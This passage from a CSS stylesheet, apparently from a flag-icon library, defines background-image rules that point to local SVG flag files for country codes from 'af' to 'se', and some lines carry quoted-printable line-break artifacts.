.flag-icon-af.flag-icon-squared { background-image: url("../flags/1x1/af.sv=
g"); }

.flag-icon-ag { background-image: url("../flags/4x3/ag.svg"); }

.flag-icon-ag.flag-icon-squared { background-image: url("../flags/1x1/ag.sv=
g"); }

.flag-icon-ai { background-image: url("../flags/4x3/ai.svg"); }

.flag-icon-ai.flag-icon-squared { background-image: url("../flags/1x1/ai.sv=
g"); }

.flag-icon-al { background-image: url("../flags/4x3/al.svg"); }

.flag-icon-al.flag-icon-squared { background-image: url("../flags/1x1/al.sv=
g"); }

.flag-icon-am { background-image: url("../flags/4x3/am.svg"); }

.flag-icon-am.flag-icon-squared { background-image: url("../flags/1x1/am.sv=
g"); }

.flag-icon-ao { background-image: url("../flags/4x3/ao.svg"); }

.flag-icon-ao.flag-icon-squared { background-image: url("../flags/1x1/ao.sv=
g"); }

.flag-icon-aq { background-image: url("../flags/4x3/aq.svg"); }

.flag-icon-aq.flag-icon-squared { background-image: url("../flags/1x1/aq.sv=
g"); }

.flag-icon-ar { background-image: url("../flags/4x3/ar.svg"); }

.flag-icon-ar.flag-icon-squared { background-image: url("../flags/1x1/ar.sv=
g"); }

.flag-icon-as { background-image: url("../flags/4x3/as.svg"); }

.flag-icon-as.flag-icon-squared { background-image: url("../flags/1x1/as.sv=
g"); }

.flag-icon-at { background-image: url("../flags/4x3/at.svg"); }

.flag-icon-at.flag-icon-squared { background-image: url("../flags/1x1/at.sv=
g"); }

.flag-icon-au { background-image: url("../flags/4x3/au.svg"); }

.flag-icon-au.flag-icon-squared { background-image: url("../flags/1x1/au.sv=
g"); }

.flag-icon-aw { background-image: url("../flags/4x3/aw.svg"); }

.flag-icon-aw.flag-icon-squared { background-image: url("../flags/1x1/aw.sv=
g"); }

.flag-icon-ax { background-image: url("../flags/4x3/ax.svg"); }

.flag-icon-ax.flag-icon-squared { background-image: url("../flags/1x1/ax.sv=
g"); }

.flag-icon-az { background-image: url("../flags/4x3/az.svg"); }

.flag-icon-az.flag-icon-squared { background-image: url("../flags/1x1/az.sv=
g"); }

.flag-icon-ba { background-image: url("../flags/4x3/ba.svg"); }

.flag-icon-ba.flag-icon-squared { background-image: url("../flags/1x1/ba.sv=
g"); }

.flag-icon-bb { background-image: url("../flags/4x3/bb.svg"); }

.flag-icon-bb.flag-icon-squared { background-image: url("../flags/1x1/bb.sv=
g"); }

.flag-icon-bd { background-image: url("../flags/4x3/bd.svg"); }

.flag-icon-bd.flag-icon-squared { background-image: url("../flags/1x1/bd.sv=
g"); }

.flag-icon-be { background-image: url("../flags/4x3/be.svg"); }

.flag-icon-be.flag-icon-squared { background-image: url("../flags/1x1/be.sv=
g"); }

.flag-icon-bf { background-image: url("../flags/4x3/bf.svg"); }

.flag-icon-bf.flag-icon-squared { background-image: url("../flags/1x1/bf.sv=
g"); }

.flag-icon-bg { background-image: url("../flags/4x3/bg.svg"); }

.flag-icon-bg.flag-icon-squared { background-image: url("../flags/1x1/bg.sv=
g"); }

.flag-icon-bh { background-image: url("../flags/4x3/bh.svg"); }

.flag-icon-bh.flag-icon-squared { background-image: url("../flags/1x1/bh.sv=
g"); }

.flag-icon-bi { background-image: url("../flags/4x3/bi.svg"); }

.flag-icon-bi.flag-icon-squared { background-image: url("../flags/1x1/bi.sv=
g"); }

.flag-icon-bj { background-image: url("../flags/4x3/bj.svg"); }

.flag-icon-bj.flag-icon-squared { background-image: url("../flags/1x1/bj.sv=
g"); }

.flag-icon-bl { background-image: url("../flags/4x3/bl.svg"); }

.flag-icon-bl.flag-icon-squared { background-image: url("../flags/1x1/bl.sv=
g"); }

.flag-icon-bm { background-image: url("../flags/4x3/bm.svg"); }

.flag-icon-bm.flag-icon-squared { background-image: url("../flags/1x1/bm.sv=
g"); }

.flag-icon-bn { background-image: url("../flags/4x3/bn.svg"); }

.flag-icon-bn.flag-icon-squared { background-image: url("../flags/1x1/bn.sv=
g"); }

.flag-icon-bo { background-image: url("../flags/4x3/bo.svg"); }

.flag-icon-bo.flag-icon-squared { background-image: url("../flags/1x1/bo.sv=
g"); }

.flag-icon-bq { background-image: url("../flags/4x3/bq.svg"); }

.flag-icon-bq.flag-icon-squared { background-image: url("../flags/1x1/bq.sv=
g"); }

.flag-icon-br { background-image: url("../flags/4x3/br.svg"); }

.flag-icon-br.flag-icon-squared { background-image: url("../flags/1x1/br.sv=
g"); }

.flag-icon-bs { background-image: url("../flags/4x3/bs.svg"); }

.flag-icon-bs.flag-icon-squared { background-image: url("../flags/1x1/bs.sv=
g"); }

.flag-icon-bt { background-image: url("../flags/4x3/bt.svg"); }

.flag-icon-bt.flag-icon-squared { background-image: url("../flags/1x1/bt.sv=
g"); }

.flag-icon-bv { background-image: url("../flags/4x3/bv.svg"); }

.flag-icon-bv.flag-icon-squared { background-image: url("../flags/1x1/bv.sv=
g"); }

.flag-icon-bw { background-image: url("../flags/4x3/bw.svg"); }

.flag-icon-bw.flag-icon-squared { background-image: url("../flags/1x1/bw.sv=
g"); }

.flag-icon-by { background-image: url("../flags/4x3/by.svg"); }

.flag-icon-by.flag-icon-squared { background-image: url("../flags/1x1/by.sv=
g"); }

.flag-icon-bz { background-image: url("../flags/4x3/bz.svg"); }

.flag-icon-bz.flag-icon-squared { background-image: url("../flags/1x1/bz.sv=
g"); }

.flag-icon-ca { background-image: url("../flags/4x3/ca.svg"); }

.flag-icon-ca.flag-icon-squared { background-image: url("../flags/1x1/ca.sv=
g"); }

.flag-icon-cc { background-image: url("../flags/4x3/cc.svg"); }

.flag-icon-cc.flag-icon-squared { background-image: url("../flags/1x1/cc.sv=
g"); }

.flag-icon-cd { background-image: url("../flags/4x3/cd.svg"); }

.flag-icon-cd.flag-icon-squared { background-image: url("../flags/1x1/cd.sv=
g"); }

.flag-icon-cf { background-image: url("../flags/4x3/cf.svg"); }

.flag-icon-cf.flag-icon-squared { background-image: url("../flags/1x1/cf.sv=
g"); }

.flag-icon-cg { background-image: url("../flags/4x3/cg.svg"); }

.flag-icon-cg.flag-icon-squared { background-image: url("../flags/1x1/cg.sv=
g"); }

.flag-icon-ch { background-image: url("../flags/4x3/ch.svg"); }

.flag-icon-ch.flag-icon-squared { background-image: url("../flags/1x1/ch.sv=
g"); }

.flag-icon-ci { background-image: url("../flags/4x3/ci.svg"); }

.flag-icon-ci.flag-icon-squared { background-image: url("../flags/1x1/ci.sv=
g"); }

.flag-icon-ck { background-image: url("../flags/4x3/ck.svg"); }

.flag-icon-ck.flag-icon-squared { background-image: url("../flags/1x1/ck.sv=
g"); }

.flag-icon-cl { background-image: url("../flags/4x3/cl.svg"); }

.flag-icon-cl.flag-icon-squared { background-image: url("../flags/1x1/cl.sv=
g"); }

.flag-icon-cm { background-image: url("../flags/4x3/cm.svg"); }

.flag-icon-cm.flag-icon-squared { background-image: url("../flags/1x1/cm.sv=
g"); }

.flag-icon-cn { background-image: url("../flags/4x3/cn.svg"); }

.flag-icon-cn.flag-icon-squared { background-image: url("../flags/1x1/cn.sv=
g"); }

.flag-icon-co { background-image: url("../flags/4x3/co.svg"); }

.flag-icon-co.flag-icon-squared { background-image: url("../flags/1x1/co.sv=
g"); }

.flag-icon-cr { background-image: url("../flags/4x3/cr.svg"); }

.flag-icon-cr.flag-icon-squared { background-image: url("../flags/1x1/cr.sv=
g"); }

.flag-icon-cu { background-image: url("../flags/4x3/cu.svg"); }

.flag-icon-cu.flag-icon-squared { background-image: url("../flags/1x1/cu.sv=
g"); }

.flag-icon-cv { background-image: url("../flags/4x3/cv.svg"); }

.flag-icon-cv.flag-icon-squared { background-image: url("../flags/1x1/cv.sv=
g"); }

.flag-icon-cw { background-image: url("../flags/4x3/cw.svg"); }

.flag-icon-cw.flag-icon-squared { background-image: url("../flags/1x1/cw.sv=
g"); }

.flag-icon-cx { background-image: url("../flags/4x3/cx.svg"); }

.flag-icon-cx.flag-icon-squared { background-image: url("../flags/1x1/cx.sv=
g"); }

.flag-icon-cy { background-image: url("../flags/4x3/cy.svg"); }

.flag-icon-cy.flag-icon-squared { background-image: url("../flags/1x1/cy.sv=
g"); }

.flag-icon-cz { background-image: url("../flags/4x3/cz.svg"); }

.flag-icon-cz.flag-icon-squared { background-image: url("../flags/1x1/cz.sv=
g"); }

.flag-icon-de { background-image: url("../flags/4x3/de.svg"); }

.flag-icon-de.flag-icon-squared { background-image: url("../flags/1x1/de.sv=
g"); }

.flag-icon-dj { background-image: url("../flags/4x3/dj.svg"); }

.flag-icon-dj.flag-icon-squared { background-image: url("../flags/1x1/dj.sv=
g"); }

.flag-icon-dk { background-image: url("../flags/4x3/dk.svg"); }

.flag-icon-dk.flag-icon-squared { background-image: url("../flags/1x1/dk.sv=
g"); }

.flag-icon-dm { background-image: url("../flags/4x3/dm.svg"); }

.flag-icon-dm.flag-icon-squared { background-image: url("../flags/1x1/dm.sv=
g"); }

.flag-icon-do { background-image: url("../flags/4x3/do.svg"); }

.flag-icon-do.flag-icon-squared { background-image: url("../flags/1x1/do.sv=
g"); }

.flag-icon-dz { background-image: url("../flags/4x3/dz.svg"); }

.flag-icon-dz.flag-icon-squared { background-image: url("../flags/1x1/dz.sv=
g"); }

.flag-icon-ec { background-image: url("../flags/4x3/ec.svg"); }

.flag-icon-ec.flag-icon-squared { background-image: url("../flags/1x1/ec.sv=
g"); }

.flag-icon-ee { background-image: url("../flags/4x3/ee.svg"); }

.flag-icon-ee.flag-icon-squared { background-image: url("../flags/1x1/ee.sv=
g"); }

.flag-icon-eg { background-image: url("../flags/4x3/eg.svg"); }

.flag-icon-eg.flag-icon-squared { background-image: url("../flags/1x1/eg.sv=
g"); }

.flag-icon-eh { background-image: url("../flags/4x3/eh.svg"); }

.flag-icon-eh.flag-icon-squared { background-image: url("../flags/1x1/eh.sv=
g"); }

.flag-icon-er { background-image: url("../flags/4x3/er.svg"); }

.flag-icon-er.flag-icon-squared { background-image: url("../flags/1x1/er.sv=
g"); }

.flag-icon-es { background-image: url("../flags/4x3/es.svg"); }

.flag-icon-es.flag-icon-squared { background-image: url("../flags/1x1/es.sv=
g"); }

.flag-icon-et { background-image: url("../flags/4x3/et.svg"); }

.flag-icon-et.flag-icon-squared { background-image: url("../flags/1x1/et.sv=
g"); }

.flag-icon-fi { background-image: url("../flags/4x3/fi.svg"); }

.flag-icon-fi.flag-icon-squared { background-image: url("../flags/1x1/fi.sv=
g"); }

.flag-icon-fj { background-image: url("../flags/4x3/fj.svg"); }

.flag-icon-fj.flag-icon-squared { background-image: url("../flags/1x1/fj.sv=
g"); }

.flag-icon-fk { background-image: url("../flags/4x3/fk.svg"); }

.flag-icon-fk.flag-icon-squared { background-image: url("../flags/1x1/fk.sv=
g"); }

.flag-icon-fm { background-image: url("../flags/4x3/fm.svg"); }

.flag-icon-fm.flag-icon-squared { background-image: url("../flags/1x1/fm.sv=
g"); }

.flag-icon-fo { background-image: url("../flags/4x3/fo.svg"); }

.flag-icon-fo.flag-icon-squared { background-image: url("../flags/1x1/fo.sv=
g"); }

.flag-icon-fr { background-image: url("../flags/4x3/fr.svg"); }

.flag-icon-fr.flag-icon-squared { background-image: url("../flags/1x1/fr.sv=
g"); }

.flag-icon-ga { background-image: url("../flags/4x3/ga.svg"); }

.flag-icon-ga.flag-icon-squared { background-image: url("../flags/1x1/ga.sv=
g"); }

.flag-icon-gb { background-image: url("../flags/4x3/gb.svg"); }

.flag-icon-gb.flag-icon-squared { background-image: url("../flags/1x1/gb.sv=
g"); }

.flag-icon-gd { background-image: url("../flags/4x3/gd.svg"); }

.flag-icon-gd.flag-icon-squared { background-image: url("../flags/1x1/gd.sv=
g"); }

.flag-icon-ge { background-image: url("../flags/4x3/ge.svg"); }

.flag-icon-ge.flag-icon-squared { background-image: url("../flags/1x1/ge.sv=
g"); }

.flag-icon-gf { background-image: url("../flags/4x3/gf.svg"); }

.flag-icon-gf.flag-icon-squared { background-image: url("../flags/1x1/gf.sv=
g"); }

.flag-icon-gg { background-image: url("../flags/4x3/gg.svg"); }

.flag-icon-gg.flag-icon-squared { background-image: url("../flags/1x1/gg.sv=
g"); }

.flag-icon-gh { background-image: url("../flags/4x3/gh.svg"); }

.flag-icon-gh.flag-icon-squared { background-image: url("../flags/1x1/gh.sv=
g"); }

.flag-icon-gi { background-image: url("../flags/4x3/gi.svg"); }

.flag-icon-gi.flag-icon-squared { background-image: url("../flags/1x1/gi.sv=
g"); }

.flag-icon-gl { background-image: url("../flags/4x3/gl.svg"); }

.flag-icon-gl.flag-icon-squared { background-image: url("../flags/1x1/gl.sv=
g"); }

.flag-icon-gm { background-image: url("../flags/4x3/gm.svg"); }

.flag-icon-gm.flag-icon-squared { background-image: url("../flags/1x1/gm.sv=
g"); }

.flag-icon-gn { background-image: url("../flags/4x3/gn.svg"); }

.flag-icon-gn.flag-icon-squared { background-image: url("../flags/1x1/gn.sv=
g"); }

.flag-icon-gp { background-image: url("../flags/4x3/gp.svg"); }

.flag-icon-gp.flag-icon-squared { background-image: url("../flags/1x1/gp.sv=
g"); }

.flag-icon-gq { background-image: url("../flags/4x3/gq.svg"); }

.flag-icon-gq.flag-icon-squared { background-image: url("../flags/1x1/gq.sv=
g"); }

.flag-icon-gr { background-image: url("../flags/4x3/gr.svg"); }

.flag-icon-gr.flag-icon-squared { background-image: url("../flags/1x1/gr.sv=
g"); }

.flag-icon-gs { background-image: url("../flags/4x3/gs.svg"); }

.flag-icon-gs.flag-icon-squared { background-image: url("../flags/1x1/gs.sv=
g"); }

.flag-icon-gt { background-image: url("../flags/4x3/gt.svg"); }

.flag-icon-gt.flag-icon-squared { background-image: url("../flags/1x1/gt.sv=
g"); }

.flag-icon-gu { background-image: url("../flags/4x3/gu.svg"); }

.flag-icon-gu.flag-icon-squared { background-image: url("../flags/1x1/gu.sv=
g"); }

.flag-icon-gw { background-image: url("../flags/4x3/gw.svg"); }

.flag-icon-gw.flag-icon-squared { background-image: url("../flags/1x1/gw.sv=
g"); }

.flag-icon-gy { background-image: url("../flags/4x3/gy.svg"); }

.flag-icon-gy.flag-icon-squared { background-image: url("../flags/1x1/gy.sv=
g"); }

.flag-icon-hk { background-image: url("../flags/4x3/hk.svg"); }

.flag-icon-hk.flag-icon-squared { background-image: url("../flags/1x1/hk.sv=
g"); }

.flag-icon-hm { background-image: url("../flags/4x3/hm.svg"); }

.flag-icon-hm.flag-icon-squared { background-image: url("../flags/1x1/hm.sv=
g"); }

.flag-icon-hn { background-image: url("../flags/4x3/hn.svg"); }

.flag-icon-hn.flag-icon-squared { background-image: url("../flags/1x1/hn.sv=
g"); }

.flag-icon-hr { background-image: url("../flags/4x3/hr.svg"); }

.flag-icon-hr.flag-icon-squared { background-image: url("../flags/1x1/hr.sv=
g"); }

.flag-icon-ht { background-image: url("../flags/4x3/ht.svg"); }

.flag-icon-ht.flag-icon-squared { background-image: url("../flags/1x1/ht.sv=
g"); }

.flag-icon-hu { background-image: url("../flags/4x3/hu.svg"); }

.flag-icon-hu.flag-icon-squared { background-image: url("../flags/1x1/hu.sv=
g"); }

.flag-icon-id { background-image: url("../flags/4x3/id.svg"); }

.flag-icon-id.flag-icon-squared { background-image: url("../flags/1x1/id.sv=
g"); }

.flag-icon-ie { background-image: url("../flags/4x3/ie.svg"); }

.flag-icon-ie.flag-icon-squared { background-image: url("../flags/1x1/ie.sv=
g"); }

.flag-icon-il { background-image: url("../flags/4x3/il.svg"); }

.flag-icon-il.flag-icon-squared { background-image: url("../flags/1x1/il.sv=
g"); }

.flag-icon-im { background-image: url("../flags/4x3/im.svg"); }

.flag-icon-im.flag-icon-squared { background-image: url("../flags/1x1/im.sv=
g"); }

.flag-icon-in { background-image: url("../flags/4x3/in.svg"); }

.flag-icon-in.flag-icon-squared { background-image: url("../flags/1x1/in.sv=
g"); }

.flag-icon-io { background-image: url("../flags/4x3/io.svg"); }

.flag-icon-io.flag-icon-squared { background-image: url("../flags/1x1/io.sv=
g"); }

.flag-icon-iq { background-image: url("../flags/4x3/iq.svg"); }

.flag-icon-iq.flag-icon-squared { background-image: url("../flags/1x1/iq.sv=
g"); }

.flag-icon-ir { background-image: url("../flags/4x3/ir.svg"); }

.flag-icon-ir.flag-icon-squared { background-image: url("../flags/1x1/ir.sv=
g"); }

.flag-icon-is { background-image: url("../flags/4x3/is.svg"); }

.flag-icon-is.flag-icon-squared { background-image: url("../flags/1x1/is.sv=
g"); }

.flag-icon-it { background-image: url("../flags/4x3/it.svg"); }

.flag-icon-it.flag-icon-squared { background-image: url("../flags/1x1/it.sv=
g"); }

.flag-icon-je { background-image: url("../flags/4x3/je.svg"); }

.flag-icon-je.flag-icon-squared { background-image: url("../flags/1x1/je.sv=
g"); }

.flag-icon-jm { background-image: url("../flags/4x3/jm.svg"); }

.flag-icon-jm.flag-icon-squared { background-image: url("../flags/1x1/jm.sv=
g"); }

.flag-icon-jo { background-image: url("../flags/4x3/jo.svg"); }

.flag-icon-jo.flag-icon-squared { background-image: url("../flags/1x1/jo.sv=
g"); }

.flag-icon-jp { background-image: url("../flags/4x3/jp.svg"); }

.flag-icon-jp.flag-icon-squared { background-image: url("../flags/1x1/jp.sv=
g"); }

.flag-icon-ke { background-image: url("../flags/4x3/ke.svg"); }

.flag-icon-ke.flag-icon-squared { background-image: url("../flags/1x1/ke.sv=
g"); }

.flag-icon-kg { background-image: url("../flags/4x3/kg.svg"); }

.flag-icon-kg.flag-icon-squared { background-image: url("../flags/1x1/kg.sv=
g"); }

.flag-icon-kh { background-image: url("../flags/4x3/kh.svg"); }

.flag-icon-kh.flag-icon-squared { background-image: url("../flags/1x1/kh.sv=
g"); }

.flag-icon-ki { background-image: url("../flags/4x3/ki.svg"); }

.flag-icon-ki.flag-icon-squared { background-image: url("../flags/1x1/ki.sv=
g"); }

.flag-icon-km { background-image: url("../flags/4x3/km.svg"); }

.flag-icon-km.flag-icon-squared { background-image: url("../flags/1x1/km.sv=
g"); }

.flag-icon-kn { background-image: url("../flags/4x3/kn.svg"); }

.flag-icon-kn.flag-icon-squared { background-image: url("../flags/1x1/kn.sv=
g"); }

.flag-icon-kp { background-image: url("../flags/4x3/kp.svg"); }

.flag-icon-kp.flag-icon-squared { background-image: url("../flags/1x1/kp.sv=
g"); }

.flag-icon-kr { background-image: url("../flags/4x3/kr.svg"); }

.flag-icon-kr.flag-icon-squared { background-image: url("../flags/1x1/kr.sv=
g"); }

.flag-icon-kw { background-image: url("../flags/4x3/kw.svg"); }

.flag-icon-kw.flag-icon-squared { background-image: url("../flags/1x1/kw.sv=
g"); }

.flag-icon-ky { background-image: url("../flags/4x3/ky.svg"); }

.flag-icon-ky.flag-icon-squared { background-image: url("../flags/1x1/ky.sv=
g"); }

.flag-icon-kz { background-image: url("../flags/4x3/kz.svg"); }

.flag-icon-kz.flag-icon-squared { background-image: url("../flags/1x1/kz.sv=
g"); }

.flag-icon-la { background-image: url("../flags/4x3/la.svg"); }

.flag-icon-la.flag-icon-squared { background-image: url("../flags/1x1/la.sv=
g"); }

.flag-icon-lb { background-image: url("../flags/4x3/lb.svg"); }

.flag-icon-lb.flag-icon-squared { background-image: url("../flags/1x1/lb.sv=
g"); }

.flag-icon-lc { background-image: url("../flags/4x3/lc.svg"); }

.flag-icon-lc.flag-icon-squared { background-image: url("../flags/1x1/lc.sv=
g"); }

.flag-icon-li { background-image: url("../flags/4x3/li.svg"); }

.flag-icon-li.flag-icon-squared { background-image: url("../flags/1x1/li.sv=
g"); }

.flag-icon-lk { background-image: url("../flags/4x3/lk.svg"); }

.flag-icon-lk.flag-icon-squared { background-image: url("../flags/1x1/lk.sv=
g"); }

.flag-icon-lr { background-image: url("../flags/4x3/lr.svg"); }

.flag-icon-lr.flag-icon-squared { background-image: url("../flags/1x1/lr.sv=
g"); }

.flag-icon-ls { background-image: url("../flags/4x3/ls.svg"); }

.flag-icon-ls.flag-icon-squared { background-image: url("../flags/1x1/ls.sv=
g"); }

.flag-icon-lt { background-image: url("../flags/4x3/lt.svg"); }

.flag-icon-lt.flag-icon-squared { background-image: url("../flags/1x1/lt.sv=
g"); }

.flag-icon-lu { background-image: url("../flags/4x3/lu.svg"); }

.flag-icon-lu.flag-icon-squared { background-image: url("../flags/1x1/lu.sv=
g"); }

.flag-icon-lv { background-image: url("../flags/4x3/lv.svg"); }

.flag-icon-lv.flag-icon-squared { background-image: url("../flags/1x1/lv.sv=
g"); }

.flag-icon-ly { background-image: url("../flags/4x3/ly.svg"); }

.flag-icon-ly.flag-icon-squared { background-image: url("../flags/1x1/ly.sv=
g"); }

.flag-icon-ma { background-image: url("../flags/4x3/ma.svg"); }

.flag-icon-ma.flag-icon-squared { background-image: url("../flags/1x1/ma.sv=
g"); }

.flag-icon-mc { background-image: url("../flags/4x3/mc.svg"); }

.flag-icon-mc.flag-icon-squared { background-image: url("../flags/1x1/mc.sv=
g"); }

.flag-icon-md { background-image: url("../flags/4x3/md.svg"); }

.flag-icon-md.flag-icon-squared { background-image: url("../flags/1x1/md.sv=
g"); }

.flag-icon-me { background-image: url("../flags/4x3/me.svg"); }

.flag-icon-me.flag-icon-squared { background-image: url("../flags/1x1/me.sv=
g"); }

.flag-icon-mf { background-image: url("../flags/4x3/mf.svg"); }

.flag-icon-mf.flag-icon-squared { background-image: url("../flags/1x1/mf.sv=
g"); }

.flag-icon-mg { background-image: url("../flags/4x3/mg.svg"); }

.flag-icon-mg.flag-icon-squared { background-image: url("../flags/1x1/mg.sv=
g"); }

.flag-icon-mh { background-image: url("../flags/4x3/mh.svg"); }

.flag-icon-mh.flag-icon-squared { background-image: url("../flags/1x1/mh.sv=
g"); }

.flag-icon-mk { background-image: url("../flags/4x3/mk.svg"); }

.flag-icon-mk.flag-icon-squared { background-image: url("../flags/1x1/mk.sv=
g"); }

.flag-icon-ml { background-image: url("../flags/4x3/ml.svg"); }

.flag-icon-ml.flag-icon-squared { background-image: url("../flags/1x1/ml.sv=
g"); }

.flag-icon-mm { background-image: url("../flags/4x3/mm.svg"); }

.flag-icon-mm.flag-icon-squared { background-image: url("../flags/1x1/mm.sv=
g"); }

.flag-icon-mn { background-image: url("../flags/4x3/mn.svg"); }

.flag-icon-mn.flag-icon-squared { background-image: url("../flags/1x1/mn.sv=
g"); }

.flag-icon-mo { background-image: url("../flags/4x3/mo.svg"); }

.flag-icon-mo.flag-icon-squared { background-image: url("../flags/1x1/mo.sv=
g"); }

.flag-icon-mp { background-image: url("../flags/4x3/mp.svg"); }

.flag-icon-mp.flag-icon-squared { background-image: url("../flags/1x1/mp.sv=
g"); }

.flag-icon-mq { background-image: url("../flags/4x3/mq.svg"); }

.flag-icon-mq.flag-icon-squared { background-image: url("../flags/1x1/mq.sv=
g"); }

.flag-icon-mr { background-image: url("../flags/4x3/mr.svg"); }

.flag-icon-mr.flag-icon-squared { background-image: url("../flags/1x1/mr.sv=
g"); }

.flag-icon-ms { background-image: url("../flags/4x3/ms.svg"); }

.flag-icon-ms.flag-icon-squared { background-image: url("../flags/1x1/ms.sv=
g"); }

.flag-icon-mt { background-image: url("../flags/4x3/mt.svg"); }

.flag-icon-mt.flag-icon-squared { background-image: url("../flags/1x1/mt.sv=
g"); }

.flag-icon-mu { background-image: url("../flags/4x3/mu.svg"); }

.flag-icon-mu.flag-icon-squared { background-image: url("../flags/1x1/mu.sv=
g"); }

.flag-icon-mv { background-image: url("../flags/4x3/mv.svg"); }

.flag-icon-mv.flag-icon-squared { background-image: url("../flags/1x1/mv.sv=
g"); }

.flag-icon-mw { background-image: url("../flags/4x3/mw.svg"); }

.flag-icon-mw.flag-icon-squared { background-image: url("../flags/1x1/mw.sv=
g"); }

.flag-icon-mx { background-image: url("../flags/4x3/mx.svg"); }

.flag-icon-mx.flag-icon-squared { background-image: url("../flags/1x1/mx.sv=
g"); }

.flag-icon-my { background-image: url("../flags/4x3/my.svg"); }

.flag-icon-my.flag-icon-squared { background-image: url("../flags/1x1/my.sv=
g"); }

.flag-icon-mz { background-image: url("../flags/4x3/mz.svg"); }

.flag-icon-mz.flag-icon-squared { background-image: url("../flags/1x1/mz.sv=
g"); }

.flag-icon-na { background-image: url("../flags/4x3/na.svg"); }

.flag-icon-na.flag-icon-squared { background-image: url("../flags/1x1/na.sv=
g"); }

.flag-icon-nc { background-image: url("../flags/4x3/nc.svg"); }

.flag-icon-nc.flag-icon-squared { background-image: url("../flags/1x1/nc.sv=
g"); }

.flag-icon-ne { background-image: url("../flags/4x3/ne.svg"); }

.flag-icon-ne.flag-icon-squared { background-image: url("../flags/1x1/ne.sv=
g"); }

.flag-icon-nf { background-image: url("../flags/4x3/nf.svg"); }

.flag-icon-nf.flag-icon-squared { background-image: url("../flags/1x1/nf.sv=
g"); }

.flag-icon-ng { background-image: url("../flags/4x3/ng.svg"); }

.flag-icon-ng.flag-icon-squared { background-image: url("../flags/1x1/ng.sv=
g"); }

.flag-icon-ni { background-image: url("../flags/4x3/ni.svg"); }

.flag-icon-ni.flag-icon-squared { background-image: url("../flags/1x1/ni.sv=
g"); }

.flag-icon-nl { background-image: url("../flags/4x3/nl.svg"); }

.flag-icon-nl.flag-icon-squared { background-image: url("../flags/1x1/nl.sv=
g"); }

.flag-icon-no { background-image: url("../flags/4x3/no.svg"); }

.flag-icon-no.flag-icon-squared { background-image: url("../flags/1x1/no.sv=
g"); }

.flag-icon-np { background-image: url("../flags/4x3/np.svg"); }

.flag-icon-np.flag-icon-squared { background-image: url("../flags/1x1/np.sv=
g"); }

.flag-icon-nr { background-image: url("../flags/4x3/nr.svg"); }

.flag-icon-nr.flag-icon-squared { background-image: url("../flags/1x1/nr.sv=
g"); }

.flag-icon-nu { background-image: url("../flags/4x3/nu.svg"); }

.flag-icon-nu.flag-icon-squared { background-image: url("../flags/1x1/nu.sv=
g"); }

.flag-icon-nz { background-image: url("../flags/4x3/nz.svg"); }

.flag-icon-nz.flag-icon-squared { background-image: url("../flags/1x1/nz.sv=
g"); }

.flag-icon-om { background-image: url("../flags/4x3/om.svg"); }

.flag-icon-om.flag-icon-squared { background-image: url("../flags/1x1/om.sv=
g"); }

.flag-icon-pa { background-image: url("../flags/4x3/pa.svg"); }

.flag-icon-pa.flag-icon-squared { background-image: url("../flags/1x1/pa.sv=
g"); }

.flag-icon-pe { background-image: url("../flags/4x3/pe.svg"); }

.flag-icon-pe.flag-icon-squared { background-image: url("../flags/1x1/pe.sv=
g"); }

.flag-icon-pf { background-image: url("../flags/4x3/pf.svg"); }

.flag-icon-pf.flag-icon-squared { background-image: url("../flags/1x1/pf.sv=
g"); }

.flag-icon-pg { background-image: url("../flags/4x3/pg.svg"); }

.flag-icon-pg.flag-icon-squared { background-image: url("../flags/1x1/pg.sv=
g"); }

.flag-icon-ph { background-image: url("../flags/4x3/ph.svg"); }

.flag-icon-ph.flag-icon-squared { background-image: url("../flags/1x1/ph.sv=
g"); }

.flag-icon-pk { background-image: url("../flags/4x3/pk.svg"); }

.flag-icon-pk.flag-icon-squared { background-image: url("../flags/1x1/pk.sv=
g"); }

.flag-icon-pl { background-image: url("../flags/4x3/pl.svg"); }

.flag-icon-pl.flag-icon-squared { background-image: url("../flags/1x1/pl.sv=
g"); }

.flag-icon-pm { background-image: url("../flags/4x3/pm.svg"); }

.flag-icon-pm.flag-icon-squared { background-image: url("../flags/1x1/pm.sv=
g"); }

.flag-icon-pn { background-image: url("../flags/4x3/pn.svg"); }

.flag-icon-pn.flag-icon-squared { background-image: url("../flags/1x1/pn.sv=
g"); }

.flag-icon-pr { background-image: url("../flags/4x3/pr.svg"); }

.flag-icon-pr.flag-icon-squared { background-image: url("../flags/1x1/pr.sv=
g"); }

.flag-icon-ps { background-image: url("../flags/4x3/ps.svg"); }

.flag-icon-ps.flag-icon-squared { background-image: url("../flags/1x1/ps.sv=
g"); }

.flag-icon-pt { background-image: url("../flags/4x3/pt.svg"); }

.flag-icon-pt.flag-icon-squared { background-image: url("../flags/1x1/pt.sv=
g"); }

.flag-icon-pw { background-image: url("../flags/4x3/pw.svg"); }

.flag-icon-pw.flag-icon-squared { background-image: url("../flags/1x1/pw.sv=
g"); }

.flag-icon-py { background-image: url("../flags/4x3/py.svg"); }

.flag-icon-py.flag-icon-squared { background-image: url("../flags/1x1/py.sv=
g"); }

.flag-icon-qa { background-image: url("../flags/4x3/qa.svg"); }

.flag-icon-qa.flag-icon-squared { background-image: url("../flags/1x1/qa.sv=
g"); }

.flag-icon-re { background-image: url("../flags/4x3/re.svg"); }

.flag-icon-re.flag-icon-squared { background-image: url("../flags/1x1/re.sv=
g"); }

.flag-icon-ro { background-image: url("../flags/4x3/ro.svg"); }

.flag-icon-ro.flag-icon-squared { background-image: url("../flags/1x1/ro.sv=
g"); }

.flag-icon-rs { background-image: url("../flags/4x3/rs.svg"); }

.flag-icon-rs.flag-icon-squared { background-image: url("../flags/1x1/rs.sv=
g"); }

.flag-icon-ru { background-image: url("../flags/4x3/ru.svg"); }

.flag-icon-ru.flag-icon-squared { background-image: url("../flags/1x1/ru.sv=
g"); }

.flag-icon-rw { background-image: url("../flags/4x3/rw.svg"); }

.flag-icon-rw.flag-icon-squared { background-image: url("../flags/1x1/rw.sv=
g"); }

.flag-icon-sa { background-image: url("../flags/4x3/sa.svg"); }

.flag-icon-sa.flag-icon-squared { background-image: url("../flags/1x1/sa.sv=
g"); }

.flag-icon-sb { background-image: url("../flags/4x3/sb.svg"); }

.flag-icon-sb.flag-icon-squared { background-image: url("../flags/1x1/sb.sv=
g"); }

.flag-icon-sc { background-image: url("../flags/4x3/sc.svg"); }

.flag-icon-sc.flag-icon-squared { background-image: url("../flags/1x1/sc.sv=
g"); }

.flag-icon-sd { background-image: url("../flags/4x3/sd.svg"); }

.flag-icon-sd.flag-icon-squared { background-image: url("../flags/1x1/sd.sv=
g"); }

.flag-icon-se { background-image: url("../flags/4x3/se.svg"); }

